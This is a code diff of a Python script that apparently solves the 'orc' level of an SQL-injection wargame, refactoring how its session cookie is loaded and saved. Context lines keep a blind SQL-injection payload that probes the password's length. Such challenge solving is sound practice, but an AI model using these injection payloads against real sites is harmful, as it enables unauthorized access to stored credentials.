@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
-import pickle
 import los
-from getpass import getpass
 
 
 def check_func(*args) -> bool:
@@ -29,17 +27,7 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
-
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cook = pickle.load(f)
-    except:
-        cook = {'PHPSESSID': getpass(
-            prompt='enter PHPSESSID cookie: ')}
-
-    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
-        print('you need to login in browser')
-        exit(1)
+    cook = los.check_cookies(url)
 
     payload = "' or length(pw)>%s #"
     param = dict(pw=payload)
@@ -67,9 +55,6 @@ def main():
 
     if 'Clear!' in response:
         print('ORC Clear!')
-
-    # Save cookie
-    los.save_cookies(cook)
 
 
 if __name__ == '__main__':
